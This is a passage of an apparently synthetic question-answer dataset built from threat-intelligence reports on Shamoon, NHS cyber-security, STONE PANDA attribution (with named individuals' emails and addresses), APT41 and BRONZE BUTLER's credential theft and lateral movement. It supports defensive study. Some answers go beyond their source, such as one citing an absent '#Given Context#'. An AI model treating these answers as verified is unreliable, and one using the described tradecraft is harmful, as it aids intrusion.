    "output": "Shamoon/Disttrack malware consists of three components: a dropper, a wiper, and a reporter module. The dropper component creates all the required files on the system, registers a service called 'TrkSvr' to start itself with Windows, and attempts to copy itself to accessible network shares and execute itself remotely if successfully copied. The wiper component is activated when a hardcoded configuration date has been passed, enabling a coordinated 'time bomb' scenario. It drops a legitimate and digitally signed device driver that provides low-level disk access from user space, collects file names, and starts overwriting them with a JPEG image or 192KB blocks of random data. Finally, it wipes the master boot record with the same data. The reporter component sends back a HTTP GET request to the C&C server, reporting the domain name, IP address, and number of files overwritten. The attackers acquired user credentials and gained access to the domain controller to push the malware onto many systems before triggering the destructive payload.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Devolved responsibility for cyber-security\n3.1 The Department of Health (the Department) has overall national responsibility for cyber-security resilience and responding to incidents in the health sector. However, the Department devolves responsibility for managing cyber-security to local organisations \u2013 NHS trusts, GPs, clinical commissioning groups and social care providers. Regulators and other national bodies oversee and support local NHS organisations. While NHS foundation trusts are directly accountable to Parliament for delivering healthcare services, they are held to account by the same regulators as NHS trusts. Roles and responsibilities for cyber-security as at September 2017 are set out in Figure 4 on pages 22 and 23. In particular:\n\u2022 NHS Improvement holds trusts and NHS foundation trusts to account for delivering value for money; and\n\u2022 the Care Quality Commission (CQC) regulates health and social care providers for safety and quality of their services.\n3.2 Both bodies can mandate local NHS organisations to improve their performance. They also have a role in ensuring that local bodies have appropriate cyber-security arrangements, but neither are primarily concerned with cyber or information technology issues. NHS Digital provides guidance, alerts and support to local organisations on cyber-security, and can visit organisations to evaluate cyber-security arrangements if asked to do so, as part of CareCERT Assure.4 However, NHS Digital cannot mandate a local body to take remedial action even if it has concerns about the vulnerability of that organisation.\n4 Prior to the WannaCry attack, NHS Digital offered an on-site inspection to hospitals to assess their cyber-security. This was known as 'CareCERT Assure' and was voluntary. NHS national bodies are currently revising this system.\n\nHow does the devolution of cyber-security responsibilities within the NHS impact its ability to respond to cyber threats like the WannaCry attack? Discuss the roles of key organizations and the limitations of their authorities.",
    "output": "The Department of Health has overall national responsibility for cyber-security resilience and incident response in the health sector. However, it devolves the actual management of cyber-security to local organizations such as NHS trusts, GPs, clinical commissioning groups, and social care providers. Key organizations involved in oversight and support include NHS Improvement, which holds trusts accountable for delivering value for money, and the Care Quality Commission (CQC), which regulates health and social care providers for the safety and quality of their services. Both bodies can mandate improvements but are not primarily focused on cyber or IT issues. NHS Digital provides guidance, alerts, and support on cyber-security and can conduct on-site inspections through programs like CareCERT Assure. However, NHS Digital lacks the authority to mandate remedial actions even if it identifies vulnerabilities. This devolved structure means that while there is guidance and support available, the ultimate responsibility for cyber-security lies with local organizations, which may lead to inconsistencies in preparedness and response capabilities across the NHS.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Background\nThroughout May 2017, using a variety of historical information and open-source intelligence (OSINT), IntrusionTruth released several blog posts identifying connected to Boyusec. Though CrowdStrike's had suspected GOTHIC PANDA was an MSS contractor for several years, the IntrusionTruth posts and subsequent research by into MSS ties to the China Information Technology Evaluation Center (CNITSEC/\u4e2d\u56fd\u4fe1\u606f\u5b89\u5168\u6d4b\u8bc4\u4e2d\u2f3c) corroborated additional details from various sources and provided a higher degree of confidence. Confidence in these findings was further boosted when the U.S. Department of Justice named Boyusec and several of the described individuals in an t, and detailed GOTHIC PANDA tactics, techniques, and procedures (TTPs) in detail.\nCrowdStrike Falcon Intelligence was able to independently verify the majority of this information and concluded that not only is CNITSEC associated with the MSS, but its former director WU Shizhong (\u5434\u4e16\u5fe0) was simultaneously dual-hatted as the director of the MSS Technology/13th Bureau (\u56fd\u5bb6\u5b89\u5168\u90e8\u79d1\u6280\u5c40\u5c40\u2ed3)1 2 3, implying that the MSS plays a crucial role in China's code review of foreign products and is now able to cherry pick high-value vulnerabilities from its own capable domestic bug hunting teams. CNITSEC's role in code review for foreign entities has led to its access to Microsoft's source code dating back to and the use by KRYPTONITE PANDA of a high-value vulnerability (CVE-2018-0802), discovered by Chinese firm Qihoo 360, a month before it was publicly revealed.\nAs research into the IntrusionTruth leads on STONE PANDA continues, Falcon Intelligence has already observed some consistencies with known MSS operations.\nMedium Headline: GAO Qiang (\u2fbc/\u90dc \u5f3a)\nMany of the personal details for GAO were scrubbed shortly after IntrusionTruth's post went live, including his Tencent QQ account. The blog connects him to the moniker fisherxp via an initial spear-phishing campaign from 2010 previously attributed to STONE PANDA. Multiple sites with profile pictures appear to show the owner of the fisherxp accounts, though this has yet to be independently confirmed as GAO. Fisherxp's QQ shows his alternate username as \u80a5\u732a or \"big porker\". IntrusionTruth later links GAO to several to the MSS Tianjin Bureau's office address where both his first name, Qiang/\u5f3a, and \u732a are used by the app to identify him and tie him to the QQ number 420192. CrowdStrike cannot confirm the validity of these Uber receipts at this time.\nHowever, fisherxp's account on popular Chinese technology forum 51CTO is still active and shows that he has downloaded not only the open-source DarkComet RAT and numerous password cracking tools, but more importantly, several favorite tools used by a plethora of known Chinese cyber adversaries including Gh0st RAT 3.6, zxarps (an ARP-spoofing tool by legacy hacker LZX), and lcx.exe (a port-forwarding tool by legacy hacker LCX)4.\nMedium Headline: ZHANG Shilong (\u5f20\u4e16\u2ef0)\nZHANG was originally by IntrusionTruth as a reciprocal follower of fisherxp's Twitter account via his own @baobeilong account. Baobeilong (\u5b9d\u2ec9\u2ef0/\"Baby Dragon\") also maintained a GitHub account that had forked both the Quasar and Trochilus RATs, two open-source tools historically used by STONE PANDA, but the account has since been scrubbed. This information was verified by CrowdStrike before being removed completely. Falcon Intelligence recently independently conducted detailed analysis of the RedLeaves malware used to target numerous Japanese defense groups and found it was directly sourced from Trochilus code, but it has undergone several evolutions and contains prefixes suggesting it could also be used to target Russia and the DPRK. There is no conclusive evidence at this time that RedLeaves is solely attributed to STONE PANDA.\nBaobeilong did maintain a Flickr account with numerous pictures that proved key in identifying his location later, similar to how cpyy's photos helped identify his affiliation to the People's Liberation Army (PLA) in CrowdStrike's .\nIntrusionTruth then drew connections from baobeilong's other online accounts to registrant details for xiaohong[.]org, which dated back to 2007 and revealed ZHANG's full name\u2014ZHANG Shilong. From there, a trail of overlapping registrant details reveals ZHANG's hanzi characters for his name (\u5f20\u4e16\u2ef0), likely one of his personal home addresses, potential work addresses and several email addresses:\nlong@xiaohong[.]org\nbaobei@xiaohong[.]org\natreexp@yahoo[.]com.cn\nrobin4700@foxmail[.]com\neshilong@vip.qq[.]com\nSpecifically tracing registrant details from atreexp \u2192 robin4700 \u2192 eshilong shows that ZHANG was active registering sites as recently as June 5, 2018, including a personal blog where his picture and name features prominently along with several technology-related blog posts.\nMedium Headline: Laoying Baichen Instruments\nThe original blog post on GAO lists his contact information in recruitment postings for two separate companies, one of which is Laoying Baichen Instruments (characters unknown at the time of this writing). No records could be found for such a firm, however, IntrusionTruth lists the address associated with it as Room 1102, Guanfu Mansion, 46 Xinkai Road, Hedong District, Tianjin (\u5929\u6d25\u5e02\u6cb3\u4e1c\u533a\u65b0\u5f00\u8def46\u53f7\u51a0\u798f\u2f24\u53a6 1102).\nDuring the course of investigating Laoying and the Guanfu mansion, Falcon Intelligence noticed that the Guanfu Mansion is also the registered address of a firm called Tianjin Henglide Technology Co., Ltd. (\u6052\u5229\u5fb7\u5929\u6d25\u79d1\u6280\u6709\u9650\u516c\u53f8), which is listed as one of only a few \"review centers\" certified by CNITSEC in Tianjin5. Laoying and Henglide are listed as being on different floors, however having a CNITSEC review center in the same building is noteworthy given CNITSEC's connection to MSS and previous linkage to Boyusec/GOTHIC PANDA.\nMedium Headline: Tianjin Huaying Haitai Science and Technology Development Company\nThe other firm GAO appears to have been recruiting for is Huaying Haitai (\u5929\u6d25\u534e\u76c8\u6d77\u6cf0\u79d1\u6280\u53d1\u5c55\u6709\u9650\u516c\u53f8). As the IntrusionTruth blog post mentions, it is a registered firm with two listed representatives, Fang Ting (\u2f45\u4ead) and Sun Lei (\u5b59\u6770), and a listed address of 1906 Fuyu Mansion (\u5929\u6d25\u5e02\u6cb3\u2ec4\u533a\u89e3\u653e\u5357\u8def\u4e2d\u6bb5\u2ec4\u4fa7\u5bcc\u88d5\u2f24\u53a61-1906).\nSearches for more information on Huaying Haitai turned up two interesting government documents. One is a recruitment Excel sheet detailing recent graduates, their majors and their new employers and addresses. Huaying Haitai is listed as having hired a recently graduated female student from Nankai University in 2013 who majored in Japanese. This is interesting considering STONE PANDA's extensive targeting of Japanese defense firms after this time period, but it is by no means conclusive evidence that the firm is connected to STONE PANDA.\nThe second government document lists Huaying Haitai as the co-organizer of a Network Security Attack and Defense competition with the Ministry of Industry and Information Technology's (MIIT) national training entity, NSACE6. It was open for all students of Henan Province.\nNSACE appears to be a national education body that teaches network information security, including offensive activity 7. This information is particularly interesting given Boyusec's previous work at CNITSEC's Guangdong subsidiary setting up a joint active defense lab8. It suggests that these technology firms act as both shell companies and recruitment grounds for potential MSS use in cyber operations.\nBig Headline: MSS Tianjin Bureau\nThe most recent IntrusionTruth post assesses that GAO's Uber rides frequently took him from Huaying's address at the Fuyu Mansion to 85 Zhujiang Road (\u73e0\u6c5f\u905385\u53f7).\nWhen observed closely, the compound is a striking one complete with towers, a fenced perimeter with surveillance cameras, guarded entrances, and a building with a significant number of satellite dishes.\nThere are no markers on the building and no government listed address; however, it is apparently difficult for locals to determine where the Tianjin Bureau's location is as well. There are several Baidu questions asking what transportation routes are best to get to that specific address. Three separate ones specifically mention the 85 Zhujiang Road address as the headquarters for the MSS's Tianjin Bureau and the difficulty in finding its location9 10 11 .\nAs with most cyber-enabled operations, satellite arrays are often indicative of installations with significant signals intelligence (SIGINT) capabilities. The Tianjin Bureau appears to have the potential for such capabilities, housing several large arrays that appear to have existed since at least January 2004.\nQuestion: What is the significance of ZHANG Shilong's online activities, particularly his involvement with the Trochilus RAT and the RedLeaves malware? How does this information relate to STONE PANDA's activities?",
    "output": "Answer: ZHANG Shilong's online activities are significant because they reveal his involvement with tools historically used by STONE PANDA. He maintained a GitHub account that forked both the Quasar and Trochilus RATs, which are open-source tools known to be used by STONE PANDA. Additionally, the RedLeaves malware, which was used to target Japanese defense groups, was directly sourced from Trochilus code. This suggests that ZHANG Shilong may have played a role in the development or deployment of malware used by STONE PANDA, although there is no conclusive evidence that RedLeaves is solely attributed to STONE PANDA.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: 6. Conclusion\nThis case study shows the typical flow of an investigation using ECAT and\t\n \u00a0Security Analytics,\t\n \u00a0which give\t\n \u00a0RSA\t\n \u00a0IR\t\n \u00a0the visibility\t\n \u00a0needed to successfully and efficiently investigate intrusions with the intent of successful remediation.\t\n \u00a0Only with full network and\t\n \u00a0endpoint visibility\t\n \u00a0can investigators\t\n \u00a0ensure they've identified all malware deployed or C2 channels used\t\n \u00a0by an adversary.\t\n \u00a0Additionally, this visibility\t\n \u00a0is critical\t\n \u00a0after remediation of\t\n \u00a0the intrusion, as APT adversaries will try to reenter\t\n \u00a0the environment.\t\n \u00a0Most APT groups are politically or economically motivated, state sponsored, highly skilled, and\t\n \u00a0therefore capable of sustaining long-\u00ad\u2010term campaigns\t\n \u00a0against their intended targets. By having proper visibility over the network you\t\n \u00a0will be able to\t\n \u00a0proactively identify new infections and\t\n \u00a0more rapidly remediate them, reducing your exposure and the adversary's opportunity to steal or manipulate more data. Traditional forensics, a.k.a dead-\u00ad\u2010box forensics, is not suitable for the nature of today's intrusions because it is too\t\n \u00a0slow and\t\n \u00a0a very reactive process. An\t\n \u00a0RSA\t\n \u00a0IR\t\n \u00a0analyst can\t\n \u00a0triage a remote system in\t\n \u00a010 \u2013 20\t\n \u00a0minutes and without affecting the endpoint. A traditional forensic process will not even\t\n \u00a0have an\t\n \u00a0image acquired\t\n \u00a0in\t\n \u00a0that time, not to\t\n \u00a0mention\t\n \u00a0the user disruption.\nWhile other defense mechanisms such as\t\n  perimeter controls\t\n  and education of users\t\n  are\t\n  extremely important at preventing\t\n  an intrusion,\t\n  the next line of defense is quick detection of malicious activity once prevention fails.\t\n  It is this proactive approach at reviewing both network traffic and endpoints for\t\n  signs of\t\n  malicious activity that\t\n  gives companies the best\t\n  chance at\t\n  quickly identifying \t\n  malicious \t\n  activity.\nECAT\t\n  cuts down the analysis time by allowing analysts to whitelist files that have already been analyzed or are trusted, focusing the analysis on only new files that appear on the\t\n  endpoints. Furthermore, ECAT\t\n  uses a variety of techniques to\t\n  distinguish\t\n  between\t\n  suspicious\t\n  and normal activity in both memory and on disk, enabling\t\n  the\t\n  analyst to focus on the\t\n  most suspicious activity. ECAT's\t\n  ability to process Yara\t\n  signatures is also an extremely useful feature\t\n  that not only allows a\t\n  company to incorporate\t\n  their own\t\n  intelligence into the product, but also import signatures from other intelligence groups that share these signatures. Lastly, ECAT allows the\t\n  analyst to quickly triage\t\n  endpoints by analyzing\t\n  their MFTs. As has been illustrated in many examples in this report, whenever a malicious artifact is found in a system, a quick triage is necessary because it can reveal many\t\n  other artifacts\t\n  such as\t\n  signs\t\n  of data exfiltration\t\n  and\t\n  remnants of older Trojans.\nSecurity Analytics complements\t\n  ECAT by\t\n  allowing\t\n  the analyst\t\n  to look for\t\n  anomalies in the communication protocols used by malware, or if the C2 channels are dormant, by identifying beaconing behavior. This is a very powerful approach that nets many\t\n  of the C2 channels in an incident.\n\nQuestion: How does the combination of ECAT and Security Analytics enhance the investigation of APT intrusions, particularly in terms of speed and efficiency?\n\nAnswer:",
    "output": "The combination of ECAT and Security Analytics enhances the investigation of APT intrusions by providing full network and endpoint visibility, which is crucial for identifying all malware deployed or C2 channels used by an adversary. ECAT cuts down the analysis time by allowing analysts to whitelist files that have already been analyzed or are trusted, focusing the analysis on only new files that appear on the endpoints. Additionally, ECAT uses various techniques to distinguish between suspicious and normal activity in both memory and on disk, enabling the analyst to focus on the most suspicious activity. Security Analytics complements ECAT by allowing the analyst to look for anomalies in the communication protocols used by malware, or if the C2 channels are dormant, by identifying beaconing behavior. This approach helps in quickly identifying malicious activity and reduces the exposure and the adversary's opportunity to steal or manipulate more data.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does APT41's use of third-party services to target victims relate to Phishing: Spearphishing via Service, and what tactics do they employ to gain access to victim systems?",
    "output": "Phishing: Spearphishing via Service is a tactic employed by adversaries to gain access to victim systems by sending spearphishing messages via third-party services. APT41, a Chinese cyber espionage group, has been observed using this tactic to target victims. According to the #Given Context#, APT41 has compromised third-party services, such as online billing/payment services and TeamViewer, to gain access to victim systems. They have also used compromised credentials to initiate TeamViewer sessions and transfer files. This is similar to Phishing: Spearphishing via Service, where adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services to gain access to victim systems. APT41's use of third-party services to target victims is a classic example of Phishing: Spearphishing via Service, where they employ social engineering tactics to generate rapport with the target and get the target's interest in some way. By creating fake social media accounts and messaging employees for potential job opportunities, APT41 can ask about services, policies, and software that's running in an environment, and then send malicious links or attachments through these services.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 4.4 \u6a2a\u65ad\u7684\u4fb5\u5bb3\n\u7d99\u7d9a\u3057\u305f\u901a\u4fe1\u3092\u78ba\u7acb\u3059\u308b\u3068\u3001BRONZE BUTLER\u306f\u30de\u30eb\u30a6\u30a7\u30a2\u3084\u30c4\u30fc\u30eb\u3092\u7528\u3044\u3066\u3001\u3088\u308a\u591a\u304f\u306e\u7aef\u672b\u3078\u3068\u611f\u67d3\u3092\u62e1\u5927\u3055\u305b\u3066\u3044\u304d\u307e\u3059\u3002\u611f\u67d3\u62e1\u5927\u306e\u305f\u3081\u306b\u4f7f\u7528\u3055\u308c\u308b\u30de\u30eb\u30a6\u30a7\u30a2\u30fb\u30c4\u30fc\u30eb\u30fb\u30b3\u30de\u30f3\u30c9\u306b\u306f\u4ee5\u4e0b\u306e\u3088\u3046\u306a\u3082\u306e\u304c\u5b58\u5728\u3057\u307e\u3059\u3002\n\u2022 Windows\u6a19\u6e96\u30b3\u30de\u30f3\u30c9\no net, ping, at, schtasks, systeminfo\nWindows\u6a19\u6e96\u30b3\u30de\u30f3\u30c9\u3092\u9664\u3044\u3066\u3001\u3053\u308c\u3089\u306e\u30de\u30eb\u30a6\u30a7\u30a2\u30fb\u30c4\u30fc\u30eb\u7fa4\u306f\u30c0\u30a6\u30f3\u30ed\u30fc\u30c0\u3092\u7528\u3044\u3066\u611f\u67d3\u7aef\u672b\u306b\u8ee2\u9001\u3055\u308c\u307e\u3059\u3002\u591a\u304f\u306e\u5834\u5408\u3001\u30c0\u30a6\u30f3\u30ed\u30fc\u30c9\u3055\u308c\u308b\u30d5\u30a1\u30a4\u30eb\u306f RAR\u30a2\u30fc\u30ab\u30a4\u30d6\u5f62\u5f0f\u3067\u3042\u308a\u3001\u30b7\u30a7\u30a2\u30a6\u30a7\u30a2\u3067\u3042\u308b WinRAR\u306e\u30b3\u30de\u30f3\u30c9\u30e9\u30a4\u30f3\u30c4\u30fc\u30eb\u3092\u7528\u3044\u3066\u5fc5\u8981\u306a\u30de\u30eb\u30a6\u30a7\u30a2\u30fb\u30c4\u30fc\u30eb\u3092\u53d6\u308a\u51fa\u3057\u307e\u3059\u3002\n\u4ee5\u4e0b\u306f\u30d7\u30ed\u30ad\u30b7\u30ed\u30b0\u3092\u5fa9\u53f7\u3057\u3066\u5f97\u3089\u308c\u305f\u7279\u5fb4\u7684\u306a\u30c0\u30a6\u30f3\u30ed\u30fc\u30c0\u5b9f\u884c\u5c65\u6b74\u3067\u3059\u3002\u672c\u4e8b\u4f8b\u3067\u306f\u3001\u30c0\u30a6\u30f3\u30ed\u30fc\u30c0\u306e\u30bd\u30fc\u30b9\u30b3\u30fc\u30c9(do.cs)\u3092\u4f5c\u6210\u3057\u3001\u611f\u67d3\u7aef\u672b\u4e0a\u3067\u30b3\u30f3\u30d1\u30a4\u30eb\u3057\u3066\u30c0\u30a6\u30f3\u30ed\u30fc\u30c0(do.exe)\u3092\u5b9f\u884c\u3057\u3066\u3044\u307e\u3059\u3002\n\u306a\u304a\u3001\u3053\u306e\u969b\u306e\u4f5c\u696d\u30d5\u30a9\u30eb\u30c0\u3068\u3057\u3066\u3001\u30c6\u30f3\u30dd\u30e9\u30ea\u30d5\u30a9\u30eb\u30c0(%TEMP%)\u306e\u307b\u304b\u3001\u30b7\u30b9\u30c6\u30e0\u30c9\u30e9\u30a4\u30d6\u76f4\u4e0b\u306b\u5b58\u5728\u3059\u308b\u30d9\u30f3\u30c0\u540d\u306e\u30d5\u30a9\u30eb\u30c0(DELL, HP, Intel\u306a\u3069)\u304c\u591a\u304f\u4f7f\u7528\u3055\u308c\u308b\u306e\u304c\u7279\u5fb4\u3067\u3059\u3002\nBRONZE BUTLER\u306f\u3001\u8a8d\u8a3c\u60c5\u5831\u53d6\u5f97\u30c4\u30fc\u30eb\u3067\u3042\u308b Mimikatz\u3084 WCE(Windows Credential Editor)\u306a\u3069\u3092\u7528\u3044\u3066\u3001\u611f\u67d3\u7aef\u672b\u4e0a\u306b\u4e00\u6642\u4fdd\u5b58\u3055\u308c\u3066\u3044\u308b\u8a8d\u8a3c\u60c5\u5831\u306e\u7a83\u53d6\u3092\u8a66\u307f\u307e\u3059\u3002\u7a83\u53d6\u306b\u6210\u529f\u3057\u305f\u5f8c\u306f\u305d\u306e\u8a8d\u8a3c\u60c5\u5831\u3092\u4f7f\u7528\u3057\u3066\u3001\u4ed6\u306e\u7aef\u672b\u3084\u30c9\u30e1\u30a4\u30f3\u30b3\u30f3\u30c8\u30ed\u30fc\u30e9\u3078\u306e\u4fb5\u5165\u3092\u8a66\u307f\u307e\u3059\u3002\n\u307e\u305f\u3001\u7d44\u7e54\u5185\u306b\u304a\u3051\u308b\u7ba1\u7406\u8005\u6a29\u9650\u3067\u306e\u30a2\u30af\u30bb\u30b9\u3092\u6c38\u7d9a\u5316\u3059\u308b\u305f\u3081\u3001Mimikatz\u3092\u7528\u3044\u3066\u30b4\u30fc\u30eb\u30c7\u30f3\u30c1\u30b1\u30c3\u30c8\u3092\u4f5c\u6210\u304a\u3088\u3073\u4f7f\u7528\u3057\u3066\u3044\u305f\u4e8b\u4f8b\u3082\u5b58\u5728\u3057\u307e\u3059\u3002\n\u30b4\u30fc\u30eb\u30c7\u30f3\u30c1\u30b1\u30c3\u30c8\u3068\u306f\u3001Active Directory\u306e\u8a8d\u8a3c\u7528\u30a2\u30ab\u30a6\u30f3\u30c8(KRBTGT)\u306e\u8a8d\u8a3c\u60c5\u5831\u3092\u4f7f\u7528\u3057\u3066\u4f5c\u6210\u3055\u308c\u305f\u3001\u4efb\u610f\u306e\u6a29\u9650\u3084\u6709\u52b9\u671f\u9650\u3092\u8a2d\u5b9a\u3057\u305f TGT\u3067\u3059\u3002\u3053\u306e\u30b4\u30fc\u30eb\u30c7\u30f3\u30c1\u30b1\u30c3\u30c8\u3092\u4f7f\u7528\u3059\u308b\u3053\u3068\u3067\u3001\u30e6\u30fc\u30b6\u8a8d\u8a3c\u306a\u3057\u306b\u7ba1\u7406\u8005\u6a29\u9650\u3067\u884c\u52d5\u3059\u308b\u3053\u3068\u304c\u53ef\u80fd\u3068\u306a\u308a\u307e\u3059\u3002\u305d\u306e\u969b\u3001\u6307\u5b9a\u3059\u308b\u30e6\u30fc\u30b6\u540d\u306f\u5b58\u5728\u3057\u3066\u3044\u306a\u3044\u30e6\u30fc\u30b6\u540d\u3067\u3082\u554f\u984c\u306a\u304f\u3001\u4ee5\u4e0b\u306e\u30e6\u30fc\u30b6\u540d\u304c\u4f7f\u7528\u3055\u308c\u3066\u3044\u305f\u3053\u3068\u3092\u78ba\u8a8d\u3057\u3066\u3044\u307e\u3059\u3002\n\u2022 bgtras\n\u2022 bgtrs\n\u2022 kkir\n\u2022 kisetr\n\u2022 netkin\n\u2022 orumls\n\u2022 wert\n\u30b4\u30fc\u30eb\u30c7\u30f3\u30c1\u30b1\u30c3\u30c8\u3092\u7121\u52b9\u306b\u3059\u308b\u306b\u306f\u3001\u8a8d\u8a3c\u7528\u30a2\u30ab\u30a6\u30f3\u30c8(KRBTGT)\u306e\u30d1\u30b9\u30ef\u30fc\u30c9\u30ea\u30bb\u30c3\u30c8\u3092 2\u56de\u9023\u7d9a\u3067\u884c\u3046\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\u3002\n\u6a29\u9650\u6607\u683c\u3068\u540c\u6642\u306b\u3001BRONZE BUTLER\u306f\u7d44\u7e54\u5185\u306e\u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u3092\u8abf\u67fb\u3057\u3001\u6b21\u306b\u4fb5\u5165\u3059\u308b\u7aef\u672b\u3084\u30d5\u30a1\u30a4\u30eb\u30b5\u30fc\u30d0\u306e\u5b58\u5728\u3092\u8abf\u67fb\u3057\u307e\u3059\u3002\u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u5185\u306e\u63a2\u7d22\u306b\u306f\u3001\u4ee5\u4e0b\u306e\u3088\u3046\u306b ping\u3084 net\u30b3\u30de\u30f3\u30c9\u306a\u3069\u3067\u60c5\u5831\u53ce\u96c6\u3057\u3066\u3044\u308b\u5834\u5408\u304c\u591a\u3044\u3067\u3059\u304c\u3001\u72ec\u81ea\u306e\u60c5\u5831\u53ce\u96c6\u30c4\u30fc\u30eb\u3092\u7528\u3044\u3066\u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u5171\u6709\u3092\u884c\u3063\u305f\u308a\u3001\u30b9\u30af\u30ea\u30fc\u30f3\u30ad\u30e3\u30d7\u30c1\u30e3\u3092\u5b9f\u884c\u3057\u305f\u308a\u3059\u308b\u4e8b\u4f8b\u3082\u78ba\u8a8d\u3057\u3066\u3044\u307e\u3059\u3002\n\u56f3 5 \u653b\u6483\u8005\u304c RAT\u7d4c\u7531\u3067\u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u5185\u3092\u63a2\u7d22\u3057\u3066\u3044\u308b\u69d8\u5b50 [by ](Source: SecureWorks)\nBRONZE BUTLER\u306f\u30d1\u30b9\u30ef\u30fc\u30c9\u30c0\u30f3\u30d7\u306b\u3088\u308a\u7a83\u53d6\u3057\u305f\u60c5\u5831\u3092\u4f7f\u7528\u3057\u3066\u4ed6\u7aef\u672b\u3078\u30d5\u30a1\u30a4\u30eb(\u30de\u30eb\u30a6\u30a7\u30a2\u306a\u3069)\u3092\u8ee2\u9001\u3057\u305f\u5f8c\u3001\u305d\u306e\u30d5\u30a1\u30a4\u30eb\u3092\u5b9f\u884c\u3057\u307e\u3059\u3002\u4ed6\u7aef\u672b\u4e0a\u3067\u30d5\u30a1\u30a4\u30eb\u3092\u5b9f\u884c\u3059\u308b\u624b\u6bb5\u3068\u3057\u3066\u3001at\u30b3\u30de\u30f3\u30c9\u304a\u3088\u3073 schtasks\u30b3\u30de\u30f3\u30c9\u306b\u3088\u308b\u30b9\u30b1\u30b8\u30e5\u30fc\u30eb\u30bf\u30b9\u30af\u767b\u9332\u304c\u4f7f\u7528\u3055\u308c\u307e\u3059\u3002\u5177\u4f53\u7684\u306b\u306f\u3001\u4ee5\u4e0b\u306e\u6d41\u308c\u3067\u4efb\u610f\u306e\u30d5\u30a1\u30a4\u30eb\u3092\u5b9f\u884c\u3057\u307e\u3059\u3002\n1. net use\u30b3\u30de\u30f3\u30c9\u304a\u3088\u3073 copy\u30b3\u30de\u30f3\u30c9\u3067\u5b9f\u884c\u3055\u305b\u305f\u3044\u30d5\u30a1\u30a4\u30eb\u3092\u6a19\u7684\u306e\u7aef\u672b\u3078\u8ee2\u9001\u3059\u308b\n2. net time\u30b3\u30de\u30f3\u30c9\u3067\u6a19\u7684\u306e\u7aef\u672b\u306e\u6642\u523b\u3092\u78ba\u8a8d\u3059\u308b\n3. at\u30b3\u30de\u30f3\u30c9\u307e\u305f\u306f schtasks\u30b3\u30de\u30f3\u30c9\u3067\u6570\u5206\u5f8c\u306b\u5b9f\u884c\u3055\u308c\u308b\u30b9\u30b1\u30b8\u30e5\u30fc\u30eb\u30bf\u30b9\u30af\u3092\u767b\u9332\u3059\u308b\n4. \u6570\u5206\u5f8c\u306b\u30b9\u30b1\u30b8\u30e5\u30fc\u30eb\u30bf\u30b9\u30af\u304a\u3088\u3073\u8ee2\u9001\u3057\u305f\u30d5\u30a1\u30a4\u30eb\u304c\u5b9f\u884c\u3055\u308c\u308b\n\u591a\u304f\u306e\u5834\u5408\u3001\u30b9\u30b1\u30b8\u30e5\u30fc\u30eb\u30bf\u30b9\u30af\u306b\u3088\u3063\u3066\u5b9f\u884c\u3055\u308c\u308b\u30d5\u30a1\u30a4\u30eb\u306f\u30d0\u30c3\u30c1\u30d5\u30a1\u30a4\u30eb\u3067\u3042\u308a\u3001\u30d0\u30c3\u30c1\u30d5\u30a1\u30a4\u30eb\u3068\u5171\u306b\u8ee2\u9001\u3057\u305f\u30de\u30eb\u30a6\u30a7\u30a2\u3092\u81ea\u52d5\u5b9f\u884c\u767b\u9332(\u30ec\u30b8\u30b9\u30c8\u30ea\u306e\u64cd\u4f5c)\u3059\u308b\u3082\u306e\u3067\u3057\u305f\u3002\u307e\u305f\u3001\u81ea\u52d5\u5b9f\u884c\u767b\u9332\u3055\u308c\u308b\u30de\u30eb\u30a6\u30a7\u30a2\u306f RAT\u306e\u307f\u3067\u306f\u306a\u304f\u3001\u30c0\u30a6\u30f3\u30ed\u30fc\u30c0\u3067\u3042\u308b\u30b1\u30fc\u30b9\u3082\u591a\u304f\u3042\u308b\u305f\u3081\u3001\u30e6\u30fc\u30b6\u304c\u30ed\u30b0\u30a4\u30f3\u3059\u308b\u3068\u307e\u305a\u5225\u306e\u30de\u30eb\u30a6\u30a7\u30a2\u306e\u30c0\u30a6\u30f3\u30ed\u30fc\u30c9\u304c\u8a66\u307f\u3089\u308c\u308b\u3068\u3044\u3046\u72b6\u6cc1\u306b\u306a\u308a\u307e\u3059\u3002\u4ee5\u4e0b\u306f\u30b9\u30b1\u30b8\u30e5\u30fc\u30eb\u30bf\u30b9\u30af\u304c\u5b9f\u884c\u3055\u308c\u3001\u30de\u30eb\u30a6\u30a7\u30a2\u306e\u81ea\u52d5\u5b9f\u884c\u767b\u9332\u304c\u884c\u306a\u308f\u308c\u308b\u307e\u3067\u306e\u69d8\u5b50\u3067\u3059\u3002\n\u56f3 6 \u5225\u7aef\u672b\u306b\u30b9\u30b1\u30b8\u30e5\u30fc\u30eb\u30bf\u30b9\u30af(zrun.bat\u306e\u5b9f\u884c)\u3092\u767b\u9332\u3057\u3066\u3044\u308b\u69d8\u5b50 [by ](Source:\nSecureWorks)\n\u56f3 7 \u30b9\u30b1\u30b8\u30e5\u30fc\u30eb\u30bf\u30b9\u30af\u304c\u5b9f\u884c\u3055\u308c\u3001\u30de\u30eb\u30a6\u30a7\u30a2\u306e\u81ea\u52d5\u5b9f\u884c\u8a2d\u5b9a\u304c\u767b\u9332\u3055\u308c\u308b\u69d8\u5b50 [by ](Source:\nSecureWorks)\n\u3055\u3089\u306b\u3001at\u30b3\u30de\u30f3\u30c9\u3084 